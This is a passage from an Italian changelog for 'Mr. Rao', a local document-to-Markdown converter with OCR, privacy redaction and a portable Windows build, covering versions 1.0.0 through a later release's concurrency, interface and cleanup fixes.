  thread per richiesta permetteva a N upload di avviare N OCR insieme.
- **Job store sfoltito da un sweeper periodico** e con tetto massimo
  (`MR_RAO_MAX_JOBS`): i risultati restavano in RAM finché non arrivava una
  nuova conversione. I job in esecuzione non vengono mai sfrattati.
- **Singleton protetti da lock**: due richieste simultanee costruivano due
  istanze di RapidOCR/MarkItDown.
- **Hotfolder**: `a.pdf` e `a.docx` producevano entrambi `a.md` e il secondo
  sovrascriveva il primo in silenzio; ora diventa `a-docx.md`. La memoria dei
  file già visti non cresce più senza limite.

### Interfaccia
- Il limite di upload lato client segue `MR_RAO_MAX_UPLOAD_MB` invece di essere
  50 fisso, e viene controllata anche la **dimensione totale** dell'invio.
- La cronologia non si duplica più a ogni clic su una voce.
- L'input file viene azzerato subito: riselezionare lo stesso file dopo un
  errore o un annullamento ora funziona.
- Drop zone attivabile da tastiera (Invio / Spazio), come promette il suo
  `role="button"`.
- Lo strip del frontmatter non divora più il testo di un documento che inizia
  con una riga orizzontale `---` (stessa logica in Python e JavaScript).

### Pulizia
- Rimossa `unique_upload_path()` (mai chiamata) e l'import morto in
  `/api/convert/compare`.
- `.gitignore` non nasconde più `MrRao.spec` dietro la regola `*.spec`: il file
  descrive il build portable e ora è committabile (finora restava fuori da git
  senza che nessuno se ne accorgesse).

## 1.1.1 — Correzioni di regressione (98 test)

### Bug corretti
- **Profilo "Solo OCR" su PDF**: `engine=rapidocr` finiva nel ramo immagine
  (`cannot identify image file`) perché il ramo `.pdf` era codice morto. Le
  scansioni PDF — il caso d'uso del profilo — fallivano sempre.
- **`.eml` che contaminava il batch**: il parser riscriveva `opts.privacy`
  sull'oggetto del chiamante, ignorando una scelta esplicita di "nessuna
  redazione" e propagandola a tutti i file successivi di batch e hotfolder.
  La policy privacy ora si decide in un unico punto (il confine API/CLI).
- **Job appesi**: un'eccezione nel thread worker lasciava lo stato a `running`
  per sempre e la UI pollava all'infinito. Ora il job passa a `error`.
- **Errori HTTP in HTML**: il 413 (e 404/405/500 sotto `/api/`) tornava una
  pagina HTML che il frontend non sa parsare. Ora sono JSON, con il limite
  reale in MB e la precisazione che vale per l'intero invio, non per file.
- **Frontmatter non valido**: `redactions: 5` seguito da chiavi indentate non
  è YAML. Ora è una mappa annidata e i valori sono quotati, quindi anche un
  nome file con `:` o `"` produce un blocco parsabile.
- **Privacy OFF di default via API**: chi chiamava `/api/convert/sync` senza
  `privacy_filter` riceveva testo in chiaro. Il default è ora fail-safe e
  coerente con la CLI.
- **Falsi positivi che rovinavano il testo**: `protocollo 0123456789` non è
  più un telefono, `Versione 1.10` non è più un importo (e non si mangia più
  lo spazio successivo), e gli IBAN sono validati con il mod-97 ISO 13616.
- **Immagini OCR fuori posto**: le pagine rasterizzate finivano in `uploads/`
  accanto all'eseguibile (cartella potenzialmente in sola lettura, residui in
  caso di crash). Ora stanno in una directory temporanea di sistema.

### Test
- `tests/test_dispatch.py`: matrice profilo × formato e isolamento delle opzioni
- Regressioni aggiunte su privacy, errori API e validità YAML del frontmatter
- 23 → 98 test

## 1.1.0 — Feature pack + portable (build verificata)

### Build portable (eseguita e testata)
- `scripts/build_portable.bat` riparato (encoding cmd) e eseguito con successo
- Output: `dist/MrRao-Portable/` (~390 MB) con `app/MrRao.exe` + dipendenze
- Smoke test: `MrRao.exe health` e `MrRao.exe convert` OK
- Fix crash console Windows: niente freccia Unicode in `app.py` (cp1252)
- CLI gestita **prima** dell'avvio server (health/convert/file drop)

### Icone
- Lockup **Mr** + **RAO** (RAO grande, Mr leggibile, no clipping)
- `mr-rao.ico` multi-size + shortcut Desktop automatico

### Feature
- System tray (pystray)
- Profili preset (email legali, fatture, solo OCR, LLM-ready, no privacy)
- Diff privacy (prima/dopo + highlight segnaposto)
- Allegati `.eml` scaricabili dall'UI
- Hotfolder watch da UI (`/api/watch`)
- Confronto 2 file (Documento A / B)
- Drag-out `.md` (Chrome/Edge) dal bottone/output
- Menu contestuale Windows + Invia a
- Export `.md` / `.txt` / copia pulita LLM
- Multi-file + merge batch, progress, annulla
- Preview Raw/Markdown, cronologia sessione, Ctrl+V immagine
- Privacy IT (email, telefoni, CF, IBAN, P.IVA, nomi) + report
- CLI `convert` / `watch` / `health`
- Tabelle PDF, frontmatter YAML, OCR RapidOCR offline
- Parser `.eml` thread IT/EN + BeautifulSoup4

### Portable install
- Sul target: **nessun Python, pip o git**
- `Installa Mr Rao.bat` → `%LOCALAPPDATA%\MrRao` + Desktop + shell
- Docs: `docs/PORTABLE.md`

## 1.0.0 — Mr. Rao

### Brand
- Rebrand completo da MarkItDown / RAOmark a **Mr. Rao**
- Logo SVG, favicon SVG, bat, README, footer

### Fix
- Aggiunto **beautifulsoup4** a requirements e installer
- Label motore: RapidOCR (non piu PaddleOCR)
- Font system-ui (offline reale)
- Upload con UUID (no collisioni)
- `debug` da env `MR_RAO_DEBUG`
- Toggle privacy HTML valido
- Errori 500 non espongono stack al client
- Thread email: match piu vicino all'inizio, depth limit

### Qualita
- Architettura a moduli `mr_rao/`
- Healthcheck `/api/health`
- Job async con progress + cancel
- Test pytest + `scripts/quality_gate.*`
- Docker / compose
